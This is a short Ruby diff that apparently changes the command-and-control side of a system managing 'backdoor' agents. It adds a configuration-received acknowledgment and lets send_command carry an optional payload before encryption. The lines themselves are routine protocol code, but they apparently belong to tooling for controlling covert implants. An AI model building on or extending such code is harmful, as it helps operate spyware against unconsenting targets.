@@ -180,6 +180,8 @@ module Command
       # configuration parser
       config = RCS::Config.new(backdoor, resp[8..-1])
       config.dump_to_file
+      # we have received the config correctly
+      send_command(PROTO_CONF, [PROTO_OK].pack('I'))
     else
       trace :info, "CONFIG -- no new conf"  
     end
@@ -321,9 +323,10 @@ module Command
   end
   
   # helper method
-  def send_command(command)
+  def send_command(command, payload = nil)
     message = [command].pack('I')
-
+    message += payload unless payload.nil?
+    
     # encrypt the message
     enc_msg = aes_encrypt_integrity(message, @session_key)
 
